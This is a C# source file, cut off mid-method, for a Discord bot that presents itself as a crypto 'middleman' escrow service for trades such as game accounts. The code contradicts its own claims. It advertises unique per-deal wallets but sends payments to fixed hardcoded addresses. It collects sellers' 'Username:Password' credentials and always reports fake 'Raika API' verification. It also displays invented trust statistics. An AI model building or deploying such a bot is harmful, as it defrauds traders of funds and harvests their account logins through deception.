using Discord;
using Discord.WebSocket;
using Discord.Net;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace DiscordBot
{
    public class Program
    {
        private DiscordSocketClient? _client;
        private readonly Dictionary<ulong, TicketData> _tickets = new();
        private readonly Dictionary<string, SessionData> _sessions = new();
        private readonly string _ltcAddress = "Ldu6DNM4NKiW4w9HWSgsh7iVb4RdJymrtS";
        private readonly string _solAddress = "9Z3rqNKbL7A4iagKs4pLyPBnCfs24T7247KMCpPrcTLw";
        private readonly string _btcAddress = "bc1qta7swuwh7s328c2kv7ktudeyfyu0f43wf034yc";

        public class SessionData
        {
            public ulong RegisterUserId { get; set; }
            public ulong? LoginUserId { get; set; }
            public string SelectedCrypto { get; set; } = "ltc";
            public ITextChannel? Channel { get; set; }
        }

        public class TicketData
        {
            public ulong ChannelId { get; set; }
            public ulong CreatorId { get; set; }
            public ulong PartnerId { get; set; }
            public ulong? SenderId { get; set; }
            public ulong? ReceiverId { get; set; }
            public bool CreatorConfirmedRoles { get; set; }
            public bool PartnerConfirmedRoles { get; set; }
            public decimal? DealAmount { get; set; }
            public bool CreatorConfirmedAmount { get; set; }
            public bool PartnerConfirmedAmount { get; set; }
            public string SelectedCrypto { get; set; } = "btc";
            public string FeePayer { get; set; } = "sender"; // sender, receiver, split, pass
            public bool CreatorConfirmedFee { get; set; }
            public bool PartnerConfirmedFee { get; set; }
            public bool IsCompleted { get; set; }
            public string? PayoutAddress { get; set; }
            public bool PayoutAddressConfirmed { get; set; }
            public bool CreatorDeleteConfirmed { get; set; }
            public bool PartnerDeleteConfirmed { get; set; }
        }

        public static Task Main(string[] args) => new Program().MainAsync();

        public async Task MainAsync()
        {
            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.Guilds | GatewayIntents.GuildMessages | GatewayIntents.DirectMessages | GatewayIntents.MessageContent
            });

            _client.Log += Log;
            _client.Ready += Client_Ready;
            _client.Ready += StartStatusRotation;
            _client.SlashCommandExecuted += SlashCommandHandler;
            _client.SelectMenuExecuted += SelectMenuHandler;
            _client.ButtonExecuted += ButtonHandler;
            _client.ModalSubmitted += ModalHandler;
            _client.MessageReceived += OnMessageReceived;

            // Reading token from environment variable to keep it secure on GitHub
            var token = Environment.GetEnvironmentVariable("DISCORD_TOKEN");

            if (string.IsNullOrEmpty(token))
            {
                Console.WriteLine("Error: DISCORD_TOKEN environment variable not set!");
                Console.WriteLine("To run locally, use: $env:DISCORD_TOKEN='your_token_here'; dotnet run");
                return;
            }

            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            await Task.Delay(-1);
        }

        private Task StartStatusRotation()
        {
            _ = Task.Run(async () =>
            {
                var statuses = new[]
                {
                    "Middlemaning your crypto deals! ₿ Ł",
                    "Trusted in 10242 servers! 🛡️",
                    "52922 in deals! 💸"
                };

                int index = 0;
                while (true)
                {
                    if (_client != null)
                    {
                        await _client.SetGameAsync(statuses[index], "https://www.twitch.tv/discord", ActivityType.Streaming);
                        index = (index + 1) % statuses.Length;
                    }
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            });
            return Task.CompletedTask;
        }

        private Task Log(LogMessage msg)
        {
            Console.WriteLine(msg.ToString());
            return Task.CompletedTask;
        }

        public Task Client_Ready()
        {
            _ = Task.Run(async () =>
            {
                if (_client == null) return;

                var ticketCommand = new SlashCommandBuilder()
                    .WithName("ticket")
                    .WithDescription("Create a new middleman ticket")
                    .AddOption("user", ApplicationCommandOptionType.User, "The user you are dealing with", isRequired: true);

                var liveTransCommand = new SlashCommandBuilder()
                    .WithName("livetransactions")
                    .WithDescription("View recent LTC transactions");

                try
                {
                    await _client.CreateGlobalApplicationCommandAsync(ticketCommand.Build());
                    await _client.CreateGlobalApplicationCommandAsync(liveTransCommand.Build());
                    Console.WriteLine("Registered commands: /ticket, /livetransactions");
                }
                catch (HttpException exception)
                {
                    var json = JsonConvert.SerializeObject(exception.Errors, Formatting.Indented);
                    Console.WriteLine(json);
                }
            });

            return Task.CompletedTask;
        }

        private async Task SlashCommandHandler(SocketSlashCommand command)
        {
            switch (command.Data.Name)
            {
                case "ticket":
                    await HandleTicketCommand(command);
                    break;
                case "livetransactions":
                    await HandleLiveTransactions(command);
                    break;
            }
        }

        private async Task HandleTicketCommand(SocketSlashCommand command)
        {
            var targetUser = (SocketGuildUser)command.Data.Options.First().Value;
            var guild = (command.Channel as SocketGuildChannel)?.Guild;

            if (guild == null) return;

            // Create private channel
            var channelName = $"ticket-{command.User.Username}-{targetUser.Username}";
            var ticketChannel = await guild.CreateTextChannelAsync(channelName, tcp =>
            {
                tcp.PermissionOverwrites = new List<Overwrite>
                {
                    new Overwrite(guild.EveryoneRole.Id, PermissionTarget.Role, new OverwritePermissions(viewChannel: PermValue.Deny)),
                    new Overwrite(command.User.Id, PermissionTarget.User, new OverwritePermissions(viewChannel: PermValue.Allow, sendMessages: PermValue.Allow)),
                    new Overwrite(targetUser.Id, PermissionTarget.User, new OverwritePermissions(viewChannel: PermValue.Allow, sendMessages: PermValue.Allow))
                };
            });

            var ticketData = new TicketData
            {
                ChannelId = ticketChannel.Id,
                CreatorId = command.User.Id,
                PartnerId = targetUser.Id
            };
            _tickets[ticketChannel.Id] = ticketData;

            await command.RespondAsync($"Ticket created: {ticketChannel.Mention}", ephemeral: true);

            var embed = new EmbedBuilder()
                .WithTitle("Crypto Selection")
                .WithColor(Color.Blue)
                .WithDescription("Please select the cryptocurrency for this deal.")
                .Build();

            var cryptoBuilder = new ComponentBuilder()
                .WithButton("Bitcoin", $"ticket_crypto_btc_{ticketChannel.Id}", ButtonStyle.Primary, emote: GetCryptoEmote("btc"))
                .WithButton("Litecoin", $"ticket_crypto_ltc_{ticketChannel.Id}", ButtonStyle.Primary, emote: GetCryptoEmote("ltc"));

            await ticketChannel.SendMessageAsync($"<@{command.User.Id}> and <@{targetUser.Id}>", embed: embed, components: cryptoBuilder.Build());
            await ticketChannel.SendMessageAsync($"Successfully added <@{targetUser.Id}> to the ticket.");
        }

        private async Task HandleRegisterCommand(SocketSlashCommand command)
        {
            var optionValue = command.Data.Options.First().Value?.ToString() ?? "ltc";
            var random = new Random();
            string code;
            do
            {
                code = random.Next(100000, 999999).ToString();
            } while (_sessions.ContainsKey(code));

            _sessions[code] = new SessionData 
            { 
                RegisterUserId = command.User.Id, 
                SelectedCrypto = optionValue,
                Channel = command.Channel as ITextChannel
            };

            var embed = new EmbedBuilder()
                .WithTitle("Session Created")
                .WithColor(Color.Blue)
                .WithDescription($"Share this unique 6-digit code with the buyer: **{code}**\n\nThe buyer must run `/login code:{code}` to begin.")
                .WithFooter(footer => footer.Text = "Waiting for buyer to join...")
                .Build();

            await command.RespondAsync(embed: embed, ephemeral: true);
        }

        private async Task HandleLoginCommand(SocketSlashCommand command)
        {
            var code = command.Data.Options.First().Value?.ToString();
            if (code != null && _sessions.TryGetValue(code, out var session))
            {
                if (session.RegisterUserId == command.User.Id)
                {
                    await command.RespondAsync("You cannot login to your own session!", ephemeral: true);
                    return;
                }

                session.LoginUserId = command.User.Id;

                // Notify the Seller (Register person) to provide account details
                var sellerEmbed = new EmbedBuilder()
                    .WithTitle("Buyer Joined!")
                    .WithColor(Color.Orange)
                    .WithDescription("The buyer has entered the code. Please click the button below to submit the account details for verification.")
                    .Build();

                var sellerBuilder = new ComponentBuilder()
                    .WithButton("Submit Account Details", $"seller_modal_trigger_{code}", ButtonStyle.Primary);

                // We try to send this to the channel or DM the seller
                if (session.Channel != null)
                {
                    await session.Channel.SendMessageAsync($"<@{session.RegisterUserId}>", embed: sellerEmbed, components: sellerBuilder.Build());
                }

                // Show the Buyer (Login person) the cryptocurrency deal as before
                var buyerEmbed = new EmbedBuilder()
                    .WithTitle("Cryptocurrency Deal")
                    .WithColor(Color.Green)
                    .AddField("Fees:", 
                        "Deals $250+: 1%\n" +
                        "Deals under $250: $2\n" +
                        "Deals under $50: $0.50\n" +
                        "**Deals under $10 are FREE**\n" +
                        "USDT & USDC has $1 surcharge")
                    .WithDescription($"You are initiating a deal involving: **{GetCryptoDisplayName(session.SelectedCrypto)}**.")
                    .WithFooter(footer => footer.Text = "Select the option below to see the payment address")
                    .Build();

                var menuBuilder = new SelectMenuBuilder()
                    .WithPlaceholder("Make a selection")
                    .WithCustomId($"crypto_selection_{code}")
                    .AddOption(GetCryptoDisplayName(session.SelectedCrypto), session.SelectedCrypto, emote: GetCryptoEmote(session.SelectedCrypto));

                await command.RespondAsync(embed: buyerEmbed, components: new ComponentBuilder().WithSelectMenu(menuBuilder).Build(), ephemeral: true);
            }
            else
            {
                await command.RespondAsync("Invalid code.", ephemeral: true);
            }
        }

        private IEmote? GetCryptoEmote(string key) => key switch
        {
            "btc" => Emote.Parse("<:btc:1477872973678514327>"),
            "eth" => Emote.Parse("<:eth:1477872840219820092>"),
            "sol" => Emote.Parse("<:solana:1477872906296889396>"),
            "ltc" => Emote.Parse("<:Ltc:1477872372836204626>"),
            _ => null
        };

        private async Task ModalHandler(SocketModal modal)
        {
            var customId = modal.Data.CustomId;
            if (customId.StartsWith("seller_modal_submit_"))
            {
                var code = modal.Data.CustomId.Split('_').Last();
                if (_sessions.TryGetValue(code, out var session))
                {
                    var embed = new EmbedBuilder()
                        .WithTitle("Account Verified!")
                        .WithColor(Color.Green)
                        .WithDescription($"✅ Your account has been verified by the **Raika API**.\n\nThe transaction is now ready for the buyer to pay.")
                        .WithFooter(footer => footer.Text = "Safe. Fast. Secure.")
                        .Build();

                    await modal.RespondAsync(embed: embed, ephemeral: true);
                }
            }
            else if (customId.StartsWith("payout_address_modal_"))
            {
                var channelId = ulong.Parse(customId.Split('_')[3]);
                if (!_tickets.TryGetValue(channelId, out var ticket)) return;

                var address = modal.Data.Components.First(x => x.CustomId == "payout_addr").Value;
                ticket.PayoutAddress = address;

                var confirmEmbed = new EmbedBuilder()
                    .WithTitle("Confirm Payout Address")
                    .WithColor(Color.Gold)
                    .WithDescription($"Is this address correct?\n\n`{address}`")
                    .Build();

                var builder = new ComponentBuilder()
                    .WithButton("Correct", $"payout_confirm_correct_{channelId}", ButtonStyle.Success)
                    .WithButton("Incorrect", $"payout_confirm_incorrect_{channelId}", ButtonStyle.Danger);

                await modal.RespondAsync(embed: confirmEmbed, components: builder.Build());
            }
        }

        private async Task HandleReadmeCommand(SocketSlashCommand command)
        {
            var embed = new EmbedBuilder()
                .WithTitle("How It Works - Automated Transaction System")
                .WithColor(Color.Gold)
                .WithDescription("Our bot provides a high-security middleman service for account trading.")
                .AddField("1. Unique Wallets", "For every transaction, the bot generates a brand new, one-time-use crypto wallet to ensure privacy and security.")
                .AddField("2. Automated Detection", "The bot monitors the blockchain in real-time. As soon as a payment is detected, the system proceeds to the next step instantly.")
                .AddField("3. Raika API Verification", "Account details (Roblox, Fortnite, etc.) are cross-referenced via the Raika API to ensure the account is legitimate and matching the description.")
                .AddField("4. Secure Payout", "Once both payment and account are verified, the bot automatically sends the funds to the seller and the account details to the buyer.")
                .WithFooter(footer => footer.Text = "Safe. Fast. Secure.")
                .Build();

            await command.RespondAsync(embed: embed, ephemeral: true);
        }


        private string GetCryptoDisplayName(string key) => key switch
        {
            "ltc" => "Litecoin",
            "btc" => "Bitcoin",
            "eth" => "Ethereum",
            "sol" => "Solana",
            "usdt_erc" => "USDT [ERC-20]",
            "usdc_erc" => "USDC [ERC-20]",
            "usdt_sol" => "USDT [SOL]",
            "usdc_sol" => "USDC [SOL]",
            _ => key.ToUpper()
        };

        private async Task HandleCryptoCommand(SocketSlashCommand command)
        {
            var embed = new EmbedBuilder()
                .WithTitle("Cryptocurrency Deal")
                .WithColor(Color.Green)
                .AddField("Fees:", 
                    "Deals $250+: 1%\n" +
                    "Deals under $250: $2\n" +
                    "Deals under $50: $0.50\n" +
                    "**Deals under $10 are FREE**\n" +
                    "USDT & USDC has $1 surcharge")
                .WithDescription("Select a cryptocurrency to initiate a deal.")
                .WithFooter(footer => { footer.Text = "Select an option below"; })
                .Build();

            var menuBuilder = new SelectMenuBuilder()
                .WithPlaceholder("Make a selection")
                .WithCustomId("crypto_selection_standalone")
                .AddOption("Litecoin", "ltc", "Initiate a Litecoin deal", emote: GetCryptoEmote("ltc"))
                .AddOption("Bitcoin", "btc", "Initiate a Bitcoin deal", emote: GetCryptoEmote("btc"))
                .AddOption("Ethereum", "eth", "Initiate an Ethereum deal", emote: GetCryptoEmote("eth"))
                .AddOption("Solana", "sol", "Initiate a Solana deal", emote: GetCryptoEmote("sol"))
                .AddOption("USDT [ERC-20]", "usdt_erc", "Initiate a USDT [ERC-20] deal")
                .AddOption("USDC [ERC-20]", "usdc_erc", "Initiate a USDC [ERC-20] deal")
                .AddOption("USDT [SOL]", "usdt_sol", "Initiate a USDT [SOL] deal")
                .AddOption("USDC [SOL]", "usdc_sol", "Initiate a USDC [SOL] deal");

            var builder = new ComponentBuilder().WithSelectMenu(menuBuilder);
            await command.RespondAsync(embed: embed, components: builder.Build(), ephemeral: true);
        }

        private async Task HandleLiveTransactions(SocketSlashCommand command, int page = 1)
        {
            using var client = new System.Net.Http.HttpClient();
            try
            {
                var blockResponse = await client.GetStringAsync("https://api.blockcypher.com/v1/ltc/main");
                var blockData = JsonConvert.DeserializeObject<dynamic>(blockResponse);
                string? latestUrl = blockData?.latest_url?.ToString();
                string latestHash = (latestUrl ?? "").Split('/', StringSplitOptions.RemoveEmptyEntries).LastOrDefault() ?? "";

                if (string.IsNullOrEmpty(latestHash))
                {
                    await command.RespondAsync("Could not fetch the latest block hash.", ephemeral: true);
                    return;
                }

                var txResponse = await client.GetStringAsync($"https://api.blockcypher.com/v1/ltc/main/blocks/{latestHash}");
                var txData = JsonConvert.DeserializeObject<dynamic>(txResponse);
                var txList = ((IEnumerable<dynamic>)txData.txids).Take(15).ToList();

                int totalPages = (int)Math.Ceiling(txList.Count / 5.0);
                var pagedTxs = txList.Skip((page - 1) * 5).Take(5);

                var embed = new EmbedBuilder()
                    .WithTitle("Live LTC Transactions")
                    .WithColor(Color.Purple)
                    .WithFooter(f => f.Text = $"Page {page} of {totalPages} | Block: {blockData?.height}")
                    .WithCurrentTimestamp();

                foreach (var txId in pagedTxs)
                {
                    embed.AddField("Transaction ID", $"`{txId}`\n[View on BlockCypher](https://live.blockcypher.com/ltc/tx/{txId}/)", false);
                }

                var builder = new ComponentBuilder()
                    .WithButton("Previous", $"page_{page - 1}", disabled: page <= 1)
                    .WithButton("Next", $"page_{page + 1}", disabled: page >= totalPages);

                await command.RespondAsync(embed: embed.Build(), components: builder.Build(), ephemeral: true);
            }
            catch { await command.RespondAsync("Error fetching data.", ephemeral: true); }
        }

        private async Task ButtonHandler(SocketMessageComponent component)
        {
            var customId = component.Data.CustomId;
            if (customId.StartsWith("seller_modal_trigger_"))
            {
                var code = customId.Split('_').Last();
                if (_sessions.TryGetValue(code, out var session))
                {
                    if (component.User.Id != session.RegisterUserId)
                    {
                        await component.RespondAsync("Only the session creator can submit details!", ephemeral: true);
                        return;
                    }

                    var mb = new ModalBuilder()
                        .WithTitle("Account Details Submission")
                        .WithCustomId($"seller_modal_submit_{code}")
                        .AddTextInput("Account Type", "acc_type", placeholder: "Roblox, Fortnite, etc.")
                        .AddTextInput("Account Details", "acc_details", TextInputStyle.Paragraph, "Username:Password");

                    await component.RespondWithModalAsync(mb.Build());
                }
            }
            else if (customId.StartsWith("ticket_crypto_"))
            {
                await HandleTicketCryptoSelection(component);
            }
            else if (customId.StartsWith("role_"))
            {
                await HandleRoleAssignmentButtons(component);
            }
            else if (customId.StartsWith("confirm_roles_"))
            {
                await HandleRoleConfirmationButtons(component);
            }
            else if (customId.StartsWith("amount_confirm_"))
            {
                await HandleAmountConfirmationButtons(component);
            }
            else if (customId.StartsWith("fee_confirm_"))
            {
                await HandleFeeConfirmationButtons(component);
            }
            else if (customId.StartsWith("fee_"))
            {
                await HandleFeeButtons(component);
            }
            else if (customId.StartsWith("release_funds_"))
            {
                await HandleReleaseFundsButton(component);
            }
            else if (customId.StartsWith("payout_modal_trigger_"))
            {
                var channelId = ulong.Parse(customId.Split('_')[3]);
                if (_tickets.TryGetValue(channelId, out var ticket))
                {
                    if (component.User.Id != ticket.ReceiverId)
                    {
                        await component.RespondAsync("Only the receiver can provide the address!", ephemeral: true);
                        return;
                    }
                    var mb = new ModalBuilder()
                        .WithTitle("Payout Address")
                        .WithCustomId($"payout_address_modal_{channelId}")
                        .AddTextInput("Your Payout Address", "payout_addr", placeholder: "Enter your BTC/LTC address here");
                    await component.RespondWithModalAsync(mb.Build());
                }
            }
            else if (customId.StartsWith("payout_confirm_"))
            {
                await HandlePayoutAddressConfirmation(component);
            }
            else if (customId.StartsWith("ticket_delete_"))
            {
                await HandleTicketDeleteConfirmation(component);
            }
            else if (customId.StartsWith("page_"))
            {
                int page = int.Parse(customId.Split('_')[1]);
                await component.DeferLoadingAsync();
                
                // Update the original message with the new page
                using var client = new System.Net.Http.HttpClient();
                var blockResponse = await client.GetStringAsync("https://api.blockcypher.com/v1/ltc/main");
                var blockData = JsonConvert.DeserializeObject<dynamic>(blockResponse);
                string? latestUrl = blockData?.latest_url?.ToString();
                string latestHash = (latestUrl ?? "").Split('/', StringSplitOptions.RemoveEmptyEntries).LastOrDefault() ?? "";
                
                var txResponse = await client.GetStringAsync($"https://api.blockcypher.com/v1/ltc/main/blocks/{latestHash}");
                var txData = JsonConvert.DeserializeObject<dynamic>(txResponse);
                var txList = ((IEnumerable<dynamic>)txData.txids).Take(15).ToList();

                int pageSize = 5;
                int totalPages = (int)Math.Ceiling(txList.Count / 5.0);
                var pagedTxs = txList.Skip((page - 1) * 5).Take(5);

                var embed = new EmbedBuilder()
                    .WithTitle("Live LTC Transactions")
                    .WithColor(Color.Purple)
                    .WithFooter(footer => { footer.Text = $"Page {page} of {totalPages} | Block: {blockData?.height}"; })
                    .WithCurrentTimestamp();

                foreach (var txId in pagedTxs)
                {
                    embed.AddField("Transaction ID", $"`{txId}`\n[View on BlockCypher](https://live.blockcypher.com/ltc/tx/{txId}/)", false);
                }

                var builder = new ComponentBuilder()
                    .WithButton("Previous", $"page_{page - 1}", disabled: page <= 1)
                    .WithButton("Next", $"page_{page + 1}", disabled: page >= totalPages);

                await component.ModifyOriginalResponseAsync(m => {
                    m.Embed = embed.Build();
                    m.Components = builder.Build();
                });
            }
            else if (customId.StartsWith("refresh_ltc_"))
            {
                await component.DeferLoadingAsync();
                using var client = new System.Net.Http.HttpClient();
                string balanceStr = "0.00";
                try
                {
                    var response = await client.GetStringAsync($"https://api.blockcypher.com/v1/ltc/main/addrs/{_ltcAddress}/balance");
                    var data = JsonConvert.DeserializeObject<dynamic>(response);
                    long balanceSatoshis = (long)(data?.balance ?? 0L);
                    balanceStr = (balanceSatoshis / 100000000.0).ToString("F4");
                }
                catch { }

                var embed = new EmbedBuilder()
                    .WithTitle("Litecoin Payment Status")
                    .WithDescription($"Address:\n**{_ltcAddress}**")
                    .AddField("Current Address Balance", $"`{balanceStr} LTC`", true)
                    .AddField("Status", "⏳ **Still waiting...**\nIf you have sent the funds, they may take a few minutes to appear in the balance.")
                    .WithFooter(footer => { footer.Text = $"Last Updated: {DateTime.UtcNow:HH:mm:ss} UTC"; })
                    .WithColor(Color.Blue)
                    .Build();

                await component.ModifyOriginalResponseAsync(m => {
                    m.Embed = embed;
                });
            }
        }

        private async Task HandleTicketCryptoSelection(SocketMessageComponent component)
        {
            var parts = component.Data.CustomId.Split('_');
            var crypto = parts[2];
            var channelId = ulong.Parse(parts[3]);

            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            ticket.SelectedCrypto = crypto;

            var embed = new EmbedBuilder()
                .WithTitle("Role Assignment")
                .WithColor(Color.Green)
                .WithDescription($"Cryptocurrency Selected: **{GetCryptoDisplayName(crypto)}** {GetCryptoEmote(crypto)}\n\nSelect one of the following buttons that corresponds to your role in this deal.\nOnce selected, both users must confirm to proceed.")
                .AddField($"Sending {GetCryptoDisplayName(crypto)}", "None", true)
                .AddField($"Receiving {GetCryptoDisplayName(crypto)}", "None", true)
                .WithFooter("Ticket will be closed in 30 minutes if left unattended.")
                .Build();

            var builder = new ComponentBuilder()
                .WithButton("Sending", $"role_sending_{channelId}", ButtonStyle.Secondary)
                .WithButton("Receiving", $"role_receiving_{channelId}", ButtonStyle.Secondary)
                .WithButton("Reset", $"role_reset_{channelId}", ButtonStyle.Danger);

            await component.UpdateAsync(m =>
            {
                m.Embed = embed;
                m.Components = builder.Build();
            });
        }

        private async Task HandleRoleAssignmentButtons(SocketMessageComponent component)
        {
            var parts = component.Data.CustomId.Split('_');
            var action = parts[1]; // sending, receiving, reset
            var channelId = ulong.Parse(parts[2]);

            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            if (action == "reset")
            {
                ticket.SenderId = null;
                ticket.ReceiverId = null;
                ticket.CreatorConfirmedRoles = false;
                ticket.PartnerConfirmedRoles = false;
            }
            else if (action == "sending")
            {
                ticket.SenderId = component.User.Id;
                if (ticket.ReceiverId == component.User.Id) ticket.ReceiverId = null;
            }
            else if (action == "receiving")
            {
                ticket.ReceiverId = component.User.Id;
                if (ticket.SenderId == component.User.Id) ticket.SenderId = null;
            }

            var embed = new EmbedBuilder()
                .WithTitle("Role Assignment")
                .WithColor(Color.Green)
                .WithDescription($"Cryptocurrency Selected: **{GetCryptoDisplayName(ticket.SelectedCrypto)}** {GetCryptoEmote(ticket.SelectedCrypto)}\n\nSelect one of the following buttons that corresponds to your role in this deal.\nOnce selected, both users must confirm to proceed.")
                .AddField($"Sending {GetCryptoDisplayName(ticket.SelectedCrypto)}", ticket.SenderId.HasValue ? $"<@{ticket.SenderId}>" : "None", true)
                .AddField($"Receiving {GetCryptoDisplayName(ticket.SelectedCrypto)}", ticket.ReceiverId.HasValue ? $"<@{ticket.ReceiverId}>" : "None", true)
                .WithFooter("Ticket will be closed in 30 minutes if left unattended.")
                .Build();

            await component.UpdateAsync(m =>
            {
                m.Embed = embed;
            });

            if (ticket.SenderId.HasValue && ticket.ReceiverId.HasValue && ticket.SenderId != ticket.ReceiverId)
            {
                var confirmEmbed = new EmbedBuilder()
                    .WithTitle("Confirm Roles")
                    .WithColor(Color.Green)
                    .WithDescription("Both users must click **Correct** to confirm your roles below.")
                    .AddField("Sender", $"<@{ticket.SenderId}>", true)
                    .AddField("Receiver", $"<@{ticket.ReceiverId}>", true)
                    .WithFooter("Selecting the wrong role may result in being scammed.")
                    .Build();

                var builder = new ComponentBuilder()
                    .WithButton("Correct", $"confirm_roles_correct_{channelId}", ButtonStyle.Success)
                    .WithButton("Incorrect", $"confirm_roles_incorrect_{channelId}", ButtonStyle.Danger);

                await component.Channel.SendMessageAsync(embed: confirmEmbed, components: builder.Build());
            }
        }

        private async Task HandleRoleConfirmationButtons(SocketMessageComponent component)
        {
            var parts = component.Data.CustomId.Split('_');
            var action = parts[2]; // correct, incorrect
            var channelId = ulong.Parse(parts[3]);

            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            if (action == "incorrect")
            {
                ticket.CreatorConfirmedRoles = false;
                ticket.PartnerConfirmedRoles = false;
                await component.RespondAsync("Roles marked as incorrect. Please use the Reset button in the Role Assignment message.", ephemeral: true);
                return;
            }

            if (component.User.Id == ticket.CreatorId) ticket.CreatorConfirmedRoles = true;
            if (component.User.Id == ticket.PartnerId) ticket.PartnerConfirmedRoles = true;

            await component.RespondAsync($"> <@{component.User.Id}> has confirmed the roles.");

            if (ticket.CreatorConfirmedRoles && ticket.PartnerConfirmedRoles)
            {
                var amountEmbed = new EmbedBuilder()
                    .WithTitle("Deal Amount")
                    .WithColor(Color.Green)
                    .WithDescription($"> <@{ticket.SenderId}>\n\n**State the amount the bot is expected to receive in USD (e.g., 100.59).**\n\nTicket will be closed in 30 minutes if left unattended.")
                    .Build();

                await component.Channel.SendMessageAsync(embed: amountEmbed);
            }
        }

        private async Task HandleAmountConfirmationButtons(SocketMessageComponent component)
        {
            var parts = component.Data.CustomId.Split('_');
            var action = parts[2]; // correct, incorrect
            var channelId = ulong.Parse(parts[3]);

            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            if (action == "incorrect")
            {
                ticket.CreatorConfirmedAmount = false;
                ticket.PartnerConfirmedAmount = false;
                ticket.DealAmount = null;
                await component.RespondAsync("Please state the amount again.", ephemeral: true);
                return;
            }

            if (component.User.Id == ticket.CreatorId) ticket.CreatorConfirmedAmount = true;
            if (component.User.Id == ticket.PartnerId) ticket.PartnerConfirmedAmount = true;

            await component.RespondAsync($"> <@{component.User.Id}> has confirmed the amount.");

            if (ticket.CreatorConfirmedAmount && ticket.PartnerConfirmedAmount)
            {
                var fee = CalculateFee(ticket.DealAmount ?? 0);
                var feeEmbed = new EmbedBuilder()
                    .WithTitle("Fee Payment")
                    .WithColor(Color.Green)
                    .WithDescription("Select one of the corresponding buttons to choose which user will be paying the Middleman fee.\n\nFee will be deducted from the balance once the deal is complete.")
                    .AddField("Fee", $"${fee:F2}", false)
                    .Build();

                var builder = new ComponentBuilder()
                    .WithButton("Sender", $"fee_sender_{channelId}", ButtonStyle.Secondary)
                    .WithButton("Receiver", $"fee_receiver_{channelId}", ButtonStyle.Secondary)
                    .WithButton("Split Fee", $"fee_split_{channelId}", ButtonStyle.Success)
                    .WithButton("Use Pass", $"fee_pass_{channelId}", ButtonStyle.Success);

                await component.Channel.SendMessageAsync(embed: feeEmbed, components: builder.Build());
            }
        }

        private async Task HandleFeeButtons(SocketMessageComponent component)
        {
            var parts = component.Data.CustomId.Split('_');
            var payer = parts[1]; // sender, receiver, split, pass
            var channelId = ulong.Parse(parts[2]);

            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            ticket.FeePayer = payer;
            var fee = CalculateFee(ticket.DealAmount ?? 0);

            var confirmFeeEmbed = new EmbedBuilder()
                .WithTitle("Confirm Fee Payer")
                .WithColor(Color.Green)
                .WithDescription($"Both users must confirm the selected fee payer: **{payer.ToUpper()}**\nFee: **${fee:F2}**")
                .Build();

            var builder = new ComponentBuilder()
                .WithButton("Correct", $"fee_confirm_correct_{channelId}", ButtonStyle.Success)
                .WithButton("Incorrect", $"fee_confirm_incorrect_{channelId}", ButtonStyle.Danger);

            await component.RespondAsync($"> <@{component.User.Id}> selected **{payer.ToUpper()}** as the fee payer.");
            await component.Channel.SendMessageAsync(embed: confirmFeeEmbed, components: builder.Build());
        }

        private async Task HandleFeeConfirmationButtons(SocketMessageComponent component)
        {
            var parts = component.Data.CustomId.Split('_');
            var action = parts[2]; // correct, incorrect
            var channelId = ulong.Parse(parts[3]);

            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            if (action == "incorrect")
            {
                ticket.CreatorConfirmedFee = false;
                ticket.PartnerConfirmedFee = false;
                await component.RespondAsync("Fee selection marked as incorrect. Please choose again.", ephemeral: true);
                return;
            }

            if (component.User.Id == ticket.CreatorId) ticket.CreatorConfirmedFee = true;
            if (component.User.Id == ticket.PartnerId) ticket.PartnerConfirmedFee = true;

            await component.RespondAsync($"> <@{component.User.Id}> has confirmed the fee payer.");

            if (ticket.CreatorConfirmedFee && ticket.PartnerConfirmedFee)
            {
                var fee = CalculateFee(ticket.DealAmount ?? 0);
                var summaryEmbed = new EmbedBuilder()
                    .WithTitle("📋 Deal Summary")
                    .WithColor(Color.Green)
                    .WithDescription("Refer to this deal summary for any reaffirmations. Notify staff for any support required.")
                    .AddField("Sender", $"<@{ticket.SenderId}>", true)
                    .AddField("Receiver", $"<@{ticket.ReceiverId}>", true)
                    .AddField("Deal Value", $"${ticket.DealAmount:F2}", true)
                    .AddField("Coin", $"{GetCryptoDisplayName(ticket.SelectedCrypto)} ({ticket.SelectedCrypto.ToUpper()})", true)
                    .AddField("Fee", $"${fee:F2} ({ticket.FeePayer.ToUpper()})", true)
                    .WithThumbnailUrl(GetCryptoThumbnail(ticket.SelectedCrypto))
                    .Build();

                await component.Channel.SendMessageAsync(embed: summaryEmbed);
                await ShowInvoice(component.Channel, ticket);
            }
        }

        private async Task HandleReleaseFundsButton(SocketMessageComponent component)
        {
            var channelId = ulong.Parse(component.Data.CustomId.Split('_')[2]);
            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            if (component.User.Id != ticket.SenderId)
            {
                await component.RespondAsync("Only the sender can release the funds!", ephemeral: true);
                return;
            }

            // Ask receiver for their payout address via Modal
            var mb = new ModalBuilder()
                .WithTitle("Payout Address")
                .WithCustomId($"payout_address_modal_{channelId}")
                .AddTextInput("Your Payout Address", "payout_addr", placeholder: "Enter your BTC/LTC address here");

            await component.RespondAsync($"> <@{ticket.SenderId}> has released the funds. <@{ticket.ReceiverId}>, please provide your payout address.");
            await component.Channel.SendMessageAsync($"<@{ticket.ReceiverId}>, click below to provide your address.", 
                components: new ComponentBuilder().WithButton("Provide Address", $"payout_modal_trigger_{channelId}", ButtonStyle.Primary).Build());
        }

        private async Task HandlePayoutAddressConfirmation(SocketMessageComponent component)
        {
            var parts = component.Data.CustomId.Split('_');
            var action = parts[2]; // correct, incorrect
            var channelId = ulong.Parse(parts[3]);

            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            if (component.User.Id != ticket.ReceiverId)
            {
                await component.RespondAsync("Only the receiver can confirm the address!", ephemeral: true);
                return;
            }

            if (action == "incorrect")
            {
                ticket.PayoutAddress = null;
                ticket.PayoutAddressConfirmed = false;
                await component.RespondAsync("Address cleared. Please provide it again.", components: new ComponentBuilder().WithButton("Provide Address", $"payout_modal_trigger_{channelId}", ButtonStyle.Primary).Build());
                return;
            }

            ticket.PayoutAddressConfirmed = true;
            await component.RespondAsync($"> <@{ticket.ReceiverId}> has confirmed the payout address.");

